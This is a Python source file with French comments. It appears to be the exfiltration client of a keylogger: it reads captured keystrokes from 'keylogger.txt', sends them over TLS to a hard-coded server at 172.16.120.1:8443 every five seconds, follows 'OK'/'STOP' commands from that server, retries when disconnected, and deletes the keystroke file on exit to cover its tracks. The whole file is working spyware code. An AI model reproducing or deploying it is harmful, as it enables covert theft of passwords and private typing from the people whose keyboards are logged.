import socket
import ssl
import time
import pathlib

def read_data_from_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data


def create_ssl_conn(host, port):

    # création du socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(3.0)

    # création du contexte ssl (avec le certificat du serveur)
    context_ssl = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context_ssl.load_verify_locations(cafile="./ssl2/certificate.pem")


    # Connexion au serveur (avec implémentation du chiffrement)
    conn_ssl = context_ssl.wrap_socket(client_socket, server_hostname='localhost')

    try:
        conn_ssl.connect((host, port))

    except Exception as e:
        print("Erreur lors de la connexion")
        return "error", "error"

    return conn_ssl, client_socket


def stop_client(conn, socket, filepath):
    # arrêt de la connexion
    conn.close()
    socket.close()

    # suppression du fichier (sans erreur si le fichier n'existe pas)
    pathlib.Path.unlink(filepath, missing_ok=True)

    exit()


host = '172.16.120.1'
port = 8443 

file_path = 'keylogger.txt'  

# Lire les données du fichier
keyboard_data = read_data_from_file(file_path)

# création du socket et de la connexion
conn, client_socket = create_ssl_conn(host, port)


running = True
t1 = time.time()


while running:
    try:
        t2 = time.time()

        if t2 - t1 > 5:
            # update de t1
            t1 = t2

            # envoyer les données au serveur
            conn.send(keyboard_data.encode('utf-8'))

            code = conn.recv(1024).decode("utf-8")

            if code == "OK":
                print("code : OK")

            elif code == "STOP":
                print("code : STOP")
                running = False

            else:
                print("code : ERROR")
                raise ssl.SSLEOFError



    except ssl.SSLEOFError:
        
        retries = 0
        disconnected = True

        t1 = time.time()

        while disconnected:
            t2 = time.time()

            if t2 - t1 > 2:
                t1 = t2

                new_conn, new_client_socket = create_ssl_conn(host, port)
                
                # si la connexion n'est pas possible avec le serveur
                if new_conn == "error":
                    retries = retries + 1

                # si la connexion a été rétablie
                else:
                    disconnected = False
                    conn = new_conn
                    client_socket = new_client_socket
            
            # si le nombre maximum de tentative de connexion a été atteint
            if retries > 3:
                print("Le serveur est injoingnable !")

                # arrêt du client
                stop_client(conn, client_socket, file_path)

    except Exception as e:
        print(e)
        

# arrêt du client
stop_client(conn, client_socket, file_path)
